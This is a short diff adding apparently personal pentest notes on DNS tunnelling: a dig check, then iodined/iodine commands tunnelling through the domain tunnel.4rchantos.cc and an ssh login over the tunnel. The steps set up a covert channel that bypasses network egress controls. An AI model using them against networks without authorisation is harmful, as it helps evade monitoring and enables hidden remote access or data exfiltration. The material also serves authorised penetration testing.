@@ -1,0 +1,14 @@
+Check DNS Tunnel
+
+  $ dig google.com @8.8.8.8
+  
+DNS Tunnel Exploitation
+
+  Step 1: Server-side
+    $ iodined -fP <username> 10.0.0.1 tunnel.4rchantos.cc
+    
+   Step 2: Client-side
+    $ iodine -fP <username> <Server Public IP> tunnel.4rchantos.cc
+    
+   Step3: Client-side
+    $ ssh <username>@10.0.0.1
